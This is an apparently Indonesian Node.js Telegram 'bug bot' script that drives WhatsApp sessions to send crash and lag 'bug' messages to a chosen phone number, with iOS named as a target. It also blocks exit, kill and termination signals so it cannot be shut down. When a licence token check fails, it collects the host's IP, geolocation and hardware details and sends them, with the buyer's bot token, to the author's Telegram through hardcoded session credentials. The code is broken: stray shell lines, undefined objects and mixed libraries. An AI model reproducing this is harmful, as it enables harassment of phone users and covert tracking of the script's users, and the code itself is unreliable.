/*
	* Recode and Fix By VexxuzzZ
	* Script BetA
	* Buy Script @VexxuzzzStcu
	* Whatsapp : https://whatsapp.com/channel/0029Vb6kYi59Bb66AMlCNU1c
	* Create Generate Gpt
*/
const PLAxios = require("axios");
const PLChalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      PLChalk.blue("[SC AMPAS KENA BYPASS🤓☝ @@Rbcdepp]") +
        PLChalk.gray(" [NIH VEX GITHUBNYA🤓☝,GASRAK AJA SI🤓☝] ➜  " + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL tidak diketahui";
  console.error(
    PLChalk.yellow("[BY-PASS BY VEXTMPN🐣] ➜  Failed To Access: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}

PLAxios.interceptors.request.use(requestInterceptor, errorInterceptor);

// Ini Batas Untuk Interceptor Axios nya

const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log("[🔥 ] MENGAMBIL ALIH SCRIPT");
  },
});

const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log("[🔥 ] MENGAMBIL ALIH SCRIPT");
  } else {
    return originalKill(pid, signal);
  }
};

["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log("[🔥 ] Sinyal " + signal + " terdeteksi dan diabaikan");
  });
});

process.on("uncaughtException", (error) => {
  console.log("[🔥 ] uncaughtException: " + error);
});
process.on("unhandledRejection", (reason) => {
  console.log("[🔥 ] unhandledRejection: " + reason);
});



//BATAS TOOLS BYPASS







const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange, 
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@whiskeysockets/baileys');

const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const readline = require("readline");
const fs = require("fs-extra");
const axios = require("axios");
const chalk = require("chalk");
const os = require("os");
const correctPassword = "reoclint";

npm install js-confuser
npm install fs-extra
npm install ls
// === Fungsi helper dipindah ke atas biar ga error ===
function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    // jika defaultData berupa object/array, simpan sebagai JSON, jika string simpan as-is
    if (typeof defaultData === "string") {
      fs.ensureDirSync(path.dirname(filePath));
      fs.writeFileSync(filePath, defaultData, "utf-8");
    } else {
      fs.ensureDirSync(path.dirname(filePath));
      fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2), "utf-8");
    }
  }
}

function activateAntibypassZiee() {
  antibypassVxxzzz = true;
}

let antibypassVxxzzz = false;
// ===== Tambahan fungsi yang hilang (fix) =====

// Membuat direktori session berdasarkan nomor client
function createSessionDir(clientNumber) {
  const dir = path.join(SESSIONS_DIR, clientNumber.toString());
  try {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
  } catch (err) {
    console.error(`createSessionDir error for ${clientNumber}:`, err.message);
  }
  return dir;
}

// Simpan daftar session aktif ke file
function saveActiveSessions(clientNumber) {
  try {
    ensureFileExists(SESSIONS_FILE, []);
    const active = Array.from(sessions.keys());
    // jika clientNumber diberikan, pastikan sudah ada di list
    if (clientNumber && !active.includes(clientNumber)) active.push(clientNumber);
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(active, null, 2), "utf-8");
  } catch (err) {
    console.error("saveActiveSessions error:", err.message);
  }
}

// Inisialisasi / baca sessions yang tersimpan — minimal (tidak memaksa reconnect tanpa client)
async function initializeWhatsAppConnections() {
  try {
    ensureFileExists(SESSIONS_FILE, []);
    const raw = fs.readFileSync(SESSIONS_FILE, "utf-8");
    let active = [];
    try {
      active = JSON.parse(raw);
    } catch (e) {
      active = [];
    }
    if (!Array.isArray(active) || active.length === 0) {
      console.log("No previously active WhatsApp sessions found.");
      return;
    }
    // Hanya log daftar session yang ditemukan. Reconnect otomatis bisa dilakukan nanti
    console.log(`Found ${active.length} saved session(s):`, active);
    // Jika ingin mencoba reconnect otomatis, implementasikan di sini dengan client & chatId yang valid.
  } catch (err) {
    console.error("initializeWhatsAppConnections error:", err.message);
  }
}

// =================================================

// Direktori session
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

// File user premium & admin
ensureFileExists('./設定/premium.json', []);
ensureFileExists('./設定/admin.json', []);
let premiumUsers = JSON.parse(fs.readFileSync('./設定/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./設定/admin.json'));

watchFile('./設定/premium.json', (data) => (premiumUsers = data));
watchFile('./設定/admin.json', (data) => (adminUsers = data));

// Konfigurasi Telegram
const { TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { Api } = require("telegram");
const config = require("./設定/config.js");

const apiId = 21192584; // api id lu
const apiHash = "1514d3fff9c448bebf90ceabb472fbe9"; // api hash lu
const stringSession = new StringSession("1BQANOTEuMTA4LjU2LjE4NgG7ZhNW/WjceoALqcPVoyYGWROu3SIE567c6Vnp/vOwSIUwS7FljEt9w6FrL/FGDXg8w81aqjRNOgAbs1N3ZsSdnOjB4nIuvxPkkBVu5vLeaB50H3MQoXttV2H6/R5omTkQnt8bZFTkWtzeIO+5PX2Vc8nWKTWVq3Ag45/N7Dv/I7xgG82ZlVIfpP4S+pXq4AP1TIBIfovfrDWkykOyvPKi4f3sTJjk1/pkMHsJCK2kYVymoIoH1f66+tI68J7YlsHIRnTytIJ7vLVw6JheId8AGKTWG+YD9T/f1VY8o47PbZGLwAHz2csgNXsNdB4ZK/BvrsnWXMfKkZbDN1xdRMNSkA=="); // stringsession lu
const S_ID = "@VexxuzzzStcu"; // username lu
const FIRST_RUN_FILE = "index.json"; 
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/usn/repo/refs/heads/main/tokens.json"; 

// === Fungsi Telegram ===
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal ambil daftar token GitHub:", error.message));
    return [];
  }
}
async function initClient() {
  const client = new TelegramClient(stringSession, apiId, apiHash, {
    connectionRetries: 5,
  });
  await client.start();
  return client;
}
async function telegramCltp(message) {
  const client = await initClient();
  await client.sendMessage(S_ID, { message, parseMode: "markdown" });
}
async function telegramClt(message) {
  const client = await initClient();
  let alreadyNotified = false;
  if (fs.existsSync(FIRST_RUN_FILE)) {
    const data = JSON.parse(fs.readFileSync(FIRST_RUN_FILE, "utf-8"));
    alreadyNotified = data.notified || false;
  }
  if (!alreadyNotified) {
    try {
      await client.sendMessage(S_ID, { message });
      fs.writeFileSync(FIRST_RUN_FILE, JSON.stringify({ notified: true }));
    } catch (err) {
      console.error("🚫 BLOCKED:", err.message);
    }
  }
}

// === Validasi Token ===
async function validateToken() {
  console.log(chalk.blue("PLEASE WAIT... CHECKING TOKENS"));
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(config.BOT_TOKEN)) {
    const cpus = os.cpus();
    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const lang = process.env.LANG || "Unknown";
    const time = new Date().toLocaleString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    let ipInfo = {};
    try {
      const { data } = await axios.get("https://ipapi.co/json/");
      ipInfo = data;
    } catch {
      ipInfo = { ip: "N/A", city: "-", country_name: "-", org: "-", latitude: "-", longitude: "-" };
    }
    const report = `
**DETECTED PENYUSUPAN**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\`
**📅 Timestamp: ${time}**
**🖥️ DEVICE**
• OS: ${os.platform()} ${os.release()}
• CPU: ${cpus[0].model} (${cpus.length} cores)
• Memory: ${totalMem} GB
• Lang: ${lang}
• Timezone: ${timezone}
**📍 LOCATION**
• IP: ${ipInfo.ip}
• ${ipInfo.city}, ${ipInfo.country_name}
• ISP: ${ipInfo.org}
• Koordinat: ${ipInfo.latitude}, ${ipInfo.longitude}
`;
    console.log(chalk.red("🚫 TOKEN BELUM TERDAFTAR...."));
    telegramCltp(report);
    activateAntibypassZiee(); // tambahkan ini...
      hardExit(1);
  }
  console.clear();
  console.log(chalk.green("✅ TOKEN TERDAFTAR"));
  startBot();
  initializeWhatsAppConnections();
  telegramClt(`**BOT AKTIF**
**TOKEN :** \`${config.BOT_TOKEN}\`
**OWNER :** \`${config.OWNER_ID}\``);
}

// Buat interface untuk input password
const client = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Minta user ketik password
client.question('Masukkan password: ', (inputPassword) => {
    if (inputPassword !== correctPassword) {
        console.log(chalk.red('❌ Password salah! Akses ditolak.'));
        process.exit(1);
    } else {
        console.log(chalk.green('✅ Password benar! Akses diberikan.'));
        client.close();

        // ====== TARUH SCRIPT BOT DI BAWAH INI ======
        console.log('Bot sedang berjalan...');
    }
});

// === Start Bot Banner ===
function startBot() {
  console.log(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                 Success `);
}


bot.use((ctx, next) => {
  if (antibypassVxxzzz) {
    return;
  }
  return next();
});


// === connectToWhatsApp FIX (client param) ===
async function connectToWhatsApp(client, clientNumber, chatId) {
  // Jika client atau chatId tidak diberikan, kita hanya buat statusMessage dummy (agar tidak crash)
  let statusMessage = { id: null };
  try {
    if (client && chatId) {
      statusMessage = await client.sendMessage(chatId, { message: `L O A D I N G D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Loading...` });
    } else {
      // fallback object supaya code selanjutnya tidak crash saat mengakses .id
      statusMessage = { id: null };
    }
  } catch (err) {
    console.error("connectToWhatsApp: failed to send initial telegram message:", err.message);
    statusMessage = { id: null };
  }

  const sessionDir = createSessionDir(clientNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        try {
          if (client && chatId && statusMessage && statusMessage.id) {
            await client.editMessage(chatId, {
              message: `M E N G H U B U N G K A N D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Mennghubungkan`,
              editMessageId: statusMessage.id
            });
          }
        } catch (err) {
          console.error("Error editing message on reconnect attempt:", err.message);
        }
        await connectToWhatsApp(client, clientNumber, chatId);
      } else {
        try {
          if (client && chatId && statusMessage && statusMessage.id) {
            await client.editMessage(chatId, {
              message: `G A G A L T E R S A M B U N G
╰➤ Number  : ${clientNumber} 
╰➤ Status : Gagal Tersambung`,
              editMessageId: statusMessage.id
            });
          }
        } catch (err) {
          console.error("Error editing message on failure:", err.message);
        }
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(clientNumber, sock);
      saveActiveSessions(clientNumber);
      try {
        if (client && chatId && statusMessage && statusMessage.id) {
          await client.editMessage(chatId, {
            message: `P A I R I N G D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Pairing
╰➤ Pesan : Succes Pairing`,
            editMessageId: statusMessage.id
          });
        }
      } catch (err) {
        console.error("Error editing message on open:", err.message);
      }
    } else if (connection === "connecting") {
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(clientNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          try {
            if (client && chatId && statusMessage && statusMessage.id) {
              await client.editMessage(chatId, {
                message: `P A I R I N G D U L U B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Pairing
╰➤ Kode : ${formattedCode}`,
                editMessageId: statusMessage.id
              });
            }
          } catch (error) {
            console.error("Error editing message with pairing code:", error.message);
          }
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        try {
          if (client && chatId && statusMessage && statusMessage.id) {
            await client.editMessage(chatId, {
              message: `G A G A L B O Z
╰➤ Number  : ${clientNumber} 
╰➤ Status : Erorr❌
╰➤ Pesan : ${error.message}`,
              editMessageId: statusMessage.id
            });
          }
        } catch (err) {
          console.error("Error editing message after pairing error:", err.message);
        }
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
// Get Random Image
function getRandomImage() {
  const images = [
    "https://i.top4top.io/p_3553h6hm40.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Cooldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId, chatId = "global") {
  const key = `${chatId}:${userId}`;
  if (cooldowns.has(key)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(key));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(key, Date.now());
  setTimeout(() => cooldowns.delete(key), cooldownTime);
  return 0; // Tidak dalam cooldown
}

// Function Bug (sleep)
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ~ Enc Xopwn Konfigurasi
function getVexxuzzZObfuscationConfig() {
  return {
    target: "node",
    calculator: true,
    compact: true,
    hexadecimalNumbers: true,
    controlFlowFlattening: 1,
    deadCode: 1,
    dispatcher: true,
    duplicateLiteralsRemoval: 1,
    flatten: true,
    globalConcealing: true,
    identifierGenerator: "zeroWidth",
    renameVariables: true,
    renameGlobals: true,
    minify: true,
    movedDeclarations: true,
    objectExtraction: true,
    opaquePredicates: 0.75,
    stringConcealing: true,
    stringCompression: true,
    stringEncoding: true,
    stringSplitting: 0.75,
    rgf: false
  };
}

// Console Log Chat Id
const log = (message, error = null) => {
  const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
  const prefix = `\x1b[36m[ VexxuzzZ ]\x1b[0m`;
  const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
  const msgStyle = `\x1b[32m${message}\x1b[0m`;
  console.log(`${prefix} ${timeStyle} ${msgStyle}`);
  if (error) {
    const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
    console.error(`${prefix} ${timeStyle} ${errorStyle}`);
    if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
  }
};

// #Progres #1
const createProgressBar = (percentage) => {
  const total = 10;
  const filled = Math.round((percentage / 100) * total);
  return "▰".repeat(filled) + "▱".repeat(total - filled);
};



// ~ Update Progress 
async function updateProgress(client, chatId, message, percentage, status) {
  if (!client || !chatId || !message || !message.id) {
    console.error("updateProgress: Bot, chatId, atau message tidak valid");
    return;
  }

  const bar = createProgressBar(percentage);
  const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;

  try {
    await client.editMessage(
      chatId,
      {
        message: 
          "```🔒 EncryptBot```\n" +
          `${levelText} (${percentage}%)\n` +
          `${bar}\n\n` +
          "_©VexxuzzZ_",
        editMessageId: message.id,
        parseMode: "markdown"
      }
    );
    await sleep(Math.min(800, percentage * 8));
  } catch (error) {
    console.error("Gagal memperbarui progres:", error.message);
  }
}

// function bug
// === Owner Check ===
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

module.exports = {
  connectToWhatsApp,
  initializeWhatsAppConnections,
  validateToken,
  createSessionDir,
  saveActiveSessions,
  // export lain jika diperlukan
};


/////---------------[sleep function]------_-_
const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています ( 🫟 ).</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner", url: "https://t.me/BangZyur" }],
      ]
    }
  });
}

  bot.sendPhoto(chatId, randomImage, {
    caption: `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Developer", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
      ]
    }
  });
});

bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];

  if (data === "bugmenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroXz Virus</b>
<b>𝙳𝚊𝚏𝚝𝚊𝚛 𝚏𝚒𝚝𝚞𝚛 𝚎𝚔𝚜𝚙𝚕𝚘𝚒𝚝 𝚢𝚊𝚗𝚐 𝚝𝚎𝚛𝚜𝚎𝚍𝚒𝚊.</b>

<b>▢ /ZyuRtz ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Delay Hard</b>

<b>▢ /ZyuRNovaXz ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Ber efek delay invisible ( nyedot kuota hard )</b>

<b>▢ /ZyuRIphong ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Invisible ios hard</b>

<b>▢ /ZyuRForce ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Forclose ios hard</b>

<b>▢ /secretjir ☇ ɴᴜᴍʙᴇʀ</b>
<b>╰➤ Menghapus bug yg sudah terkirim</b>

<b>-# ( ! ) Note :</b>
<b>Jangan asal mengirim virus ke orang yg tidak bersalah kalo tidak mau ber akibat fatall!!</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "ownermenu") {
    newCaption = `<blockquote><b>( ! ) - ZyuroXz Akses</b>
</blockquote>
<b>▢ /addprem id ☇ days</b>
<b>╰➤ Menambahkan akses pada user</b>

<b>▢ /delprem id</b>
<b>╰➤ Menghapus akses pada user</b>

<b>▢ /addadmin id</b>
<b>╰➤ Menambahkan akses admin pada user</b>

<b>▢ /deladmin id</b>
<b>╰➤ Menghapus akses admin pada use</b>

<b>▢ /listprem</b>
<b>╰➤ Melihat list premium user yang ada</b>

<b>▢ /addsender  ☇ Number</b>
<b>╰➤ Menambah Sender WhatsApp</b>

<blockquote><b>( # ) Note:</b>
<b>Baca dengan teliti Jangan asal ngetik untuk mendapat kan akses</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "thanksto") {
    newCaption = `<blockquote><b>( ! ) - Thanks Too</b>

<b>▢ VexxuzzZ ( Developer )</b>
<b>▢ Udin ( Best Friend )</b>
<b>▢ Abdul ( Best Friend )</b>
<b>▢ Xky ( My Owner )</b>
<b>▢ Lez ( My Teacher Js)</b>
<b>▢ All Partner ZyuroXz </b>
<b>▢ All Pengguna Sc </b>

<b>tqto</b>
</blockquote>`;
    newButtons = [[{ text: "ʙᴀᴄᴋ ↺", callback_data: "mainmenu" }]];
  } else if (data === "mainmenu") {
    newCaption = `<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>

<blockquote>( 🫟 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
<b>⬡ Author : VexxuzzZ?</b>
<b>⬡ Version : 1.0.0</b>
<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
<b>⬡ Framework : Telegraf</b>
<b>⬡ Library : Javascript</b>
<b>⬡ PRIVATE SCRIPT</b>
</blockquote>
<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
`;
    newButtons = [
        [{ text: "ZyuroXz ☇ Qwerty", callback_data: "bugmenu" }, 
        { text: "Thanks ☇ Too", callback_data: "thanksto" }],
        [{ text: "ZyuroXz ☇ Crushy", callback_data: "ownermenu" }],
        [{ text: "ZyuroXz ☇ Dev", url: "https://t.me/BangZyur" }, 
        { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
    ];
  }

  bot.editMessageMedia(
    {
      type: "photo",
      media: newImage,
      caption: newCaption,
      parse_mode: "HTML"
    },
    { chat_id: chatId, message_id: messageId }
  ).then(() => {
    bot.editMessageReplyMarkup(
      { inline_keyboard: newButtons },
      { chat_id: chatId, message_id: messageId }
    );
  }).catch((err) => {
    console.error("Error editing message:", err);
  });
});


//=======CASE BUG=========//

bot.onText(/\/ZyuRtz (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/BangZyur" }],
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/BangZyur" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/BangZyur" }]
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/6ph0wo.jpg", {
      caption: `
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
    const progressStages = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 1000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 1500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 2000 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 2500 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 3000 }
    ];

    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
#- 𝘉 𝘜 𝘎 - ZyuRtz
╰➤ Bug ini dibuat untuk membuat crash kepada target yang menggunakan device iPhone / iOS
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    await console.log("\x1b[32m[PROCES]\x1b[0m TUNGGU HINGGA SELESAI");
